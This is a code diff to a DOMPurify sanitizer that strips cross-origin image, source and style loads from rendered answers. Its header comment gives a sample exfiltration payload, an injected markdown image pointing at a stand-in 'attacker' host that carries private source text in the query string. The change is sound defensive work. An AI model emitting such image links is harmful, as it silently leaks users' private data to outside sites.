@@ -12,20 +12,48 @@
  * turns into a live element when Vue parses the result a second time. DOMPurify
  * checks namespaces and re-parse safety. KaTeX output (spans, inline styles,
  * MathML, SVG) and citation markers (class / data-* attributes) pass through.
+ *
+ * Images and styles may not load anything from another site: an injected
+ * ![](https://attacker/?q=<private text>) would otherwise send the text of the
+ * user's sources to that site as soon as the answer is shown. Links stay, since
+ * they are only followed when clicked.
  */
 
 import DOMPurify from 'dompurify'
 
 let configured = false
 
+const AUTO_LOADING_ATTRIBUTES = ['src', 'srcset', 'href', 'xlink:href', 'background', 'poster']
+
+/** True for URLs the browser would fetch from another origin (http/https/protocol-relative). */
+function isCrossOriginFetch(value: string): boolean {
+  const compact = value.replace(/[\u0000-\u0020\u007f-\u009f]/g, '')
+  if (!compact) return false
+  try {
+    const url = new URL(compact, window.location.href)
+    return (url.protocol === 'http:' || url.protocol === 'https:') && url.origin !== window.location.origin
+  } catch {
+    return true
+  }
+}
+
 function configure() {
   if (configured) return
   configured = true
-  // Links that open a new tab must not get a handle on this window.
   DOMPurify.addHook('afterSanitizeAttributes', (node) => {
-    if (node.tagName === 'A' && node.getAttribute('target') === '_blank') {
-      node.setAttribute('rel', 'noopener noreferrer')
+    const tag = node.tagName.toLowerCase()
+    // Links that open a new tab must not get a handle on this window.
+    if (tag === 'a') {
+      if (node.getAttribute('target') === '_blank') node.setAttribute('rel', 'noopener noreferrer')
+      return
     }
+    // Anything else that loads a resource by itself must stay on this site (or data:/blob:).
+    for (const name of AUTO_LOADING_ATTRIBUTES) {
+      const value = node.getAttribute(name)
+      if (value !== null && (name === 'srcset' || isCrossOriginFetch(value))) node.removeAttribute(name)
+    }
+    const style = node.getAttribute('style')
+    if (style && /url\s*\(|image-set\s*\(|@import/i.test(style)) node.removeAttribute('style')
   })
 }
 
